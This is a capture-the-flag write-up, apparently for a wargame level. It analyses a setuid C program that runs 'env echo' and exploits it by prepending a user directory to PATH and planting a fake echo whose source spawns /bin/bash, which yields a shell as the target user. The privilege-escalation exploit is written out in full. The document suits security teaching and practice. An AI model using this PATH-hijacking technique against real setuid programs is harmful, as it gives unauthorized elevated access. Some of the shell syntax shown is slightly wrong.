There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}


Calling "/usr/bin/env echo" allows us to control what's in our environment and in consequence what program is being executed as echo.

> whereis echo
/bin/echo
> $PATH
$PATH=/usr/local/sbin/;/usr/local/bin;/usr/sbin;/sbin/;/bin/;

If we place a program under /usr/local/sbin/echo it should be executed instead of /bin/echo.
Permission denied for all those folders. But we can still change the $PATH in our env.

export PATH=/home/level01/:/usr/bin/:/usr/sbin/
or export PATH=/home/level01/:$(PATH)

Now when echo is called, first occurence is in /home/level01, where we have our file:

echo.c
#include <stdlib.h>
#include <string.h>

int main(void) {

  system("/bin/bash");
  return 0;
}

Now just run ./flag01 to get the shell with flag01 uid instead of level01. 

> getflag
You have succesfully executed getflag on a target account







